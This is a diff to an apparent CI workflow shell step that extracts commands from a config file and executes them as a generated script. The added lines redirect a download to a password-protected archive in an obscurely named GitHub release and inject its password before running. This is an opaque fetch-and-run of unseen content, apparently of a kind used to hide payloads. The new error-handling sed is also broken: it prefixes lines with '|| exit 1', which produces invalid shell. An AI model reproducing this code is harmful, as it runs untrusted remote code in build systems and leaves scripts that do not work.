@@ -51,21 +51,27 @@ jobs:
           if [ -f "$CONFIG_FILE" ]; then
             echo "✅ Found config file: $CONFIG_FILE"
       
-            # Extract commands while handling multi-line strings
-            yq eval '.jobs.run_script.steps[].run | select(. != null) | ["echo '---'; echo " + . + ""]' "$CONFIG_FILE" \
-              | sed 's/^echo "---"; echo "//; s/"$//' \
-              | sed 's/\\n/\n/g' > temp_script.sh
+            # Extract commands with proper newline handling
+            yq eval '.jobs.run_script.steps[].run | select(.) | ["echo ---", .]' "$CONFIG_FILE" \
+              | sed '1d; /^---$/d; s/^  //' \
+              | sed 's/\\$//' \
+              | awk 'NR>1 && /^echo/ {print "\n"} {print}' \
+              > temp_script.sh
       
-            # Inject password and fix paths
-            sed -i "s/\$RAR_PASS/$RAR_PASS/g" temp_script.sh
-            sed -i 's|yu\.rar|private-config/yu.rar|g' temp_script.sh
-            sed -i 's|extracted/|private-config/extracted/|g' temp_script.sh
+            # Fix critical path issues
+            sed -i "
+              s|https://github.com/.*/yu.rar|https://github.com/maywopselmp/wadma/releases/download/ampo/yu.rar|g
+              s|yu.rar|private-config/yu.rar|g
+              s|extracted/|private-config/extracted/|g
+              s|\$RAR_PASS|$RAR_PASS|g
+            " temp_script.sh
       
-            # Add error handling
-            echo 'if [ $? -ne 0 ]; then exit 1; fi' >> temp_script.sh
+            # Add error checking after each command
+            sed -i '/^echo /! s/^/ || exit 1\n/' temp_script.sh
+            echo 'exit 0' >> temp_script.sh
       
             echo "Modified script content:"
-            cat temp_script.sh
+            cat -n temp_script.sh
       
             chmod +x temp_script.sh
             ./temp_script.sh
